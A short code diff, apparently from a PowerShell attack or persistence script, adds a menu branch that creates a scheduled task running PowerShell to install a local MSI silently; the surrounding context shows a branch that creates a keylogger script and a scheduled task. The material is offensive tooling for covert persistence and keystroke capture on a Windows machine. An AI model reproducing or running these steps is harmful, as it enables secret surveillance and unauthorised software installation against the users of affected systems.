@@ -348,6 +348,11 @@ temps()
         createScriptKeylogger 
         task
   }
+
+  7 {
+    $actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-Command "& {Start-Process -FilePath "C:\Users\nolan\ps.msi" -ArgumentList "/qn" -Wait}"')
+    task
+  }
 }
 
 
